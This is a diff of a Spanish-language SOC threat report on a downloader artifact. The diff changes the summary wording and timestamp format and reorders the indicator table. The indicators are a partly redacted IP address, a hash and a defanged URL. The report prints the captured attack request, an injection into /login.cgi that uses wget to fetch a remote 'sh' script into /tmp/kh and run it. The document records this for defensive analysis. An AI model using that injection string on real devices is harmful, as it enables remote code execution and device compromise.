@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 203 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxp://109.104.153.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:19:44+00:00`
+- **Registrado:** `2026-08-09T20:19:44.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,10 +53,10 @@ GET /login.cgi?cli=aa%20aa%27;wget%20http://109.104.153.XXX/sh%20-O%20-%3E%20/tm
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 109.104.153.XXX | static_analysis |
 | url | hxxp://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
-| hash | a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1 | static_analysis |
+| ip | 109.104.153.XXX | static_analysis |
 | command | GET /login.cgi?cli=aa%20aa%27;wget%20http://109.104.153.XXX/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1 | strings |
+| hash | a0b248dd85e7226f7e96a23d6c15085c349217f47e09afbeb1785f31c71922a1 | static_analysis |
 | ip | 219.79.105.XXX | artifact_source |
 
 ## 🔎 Triage
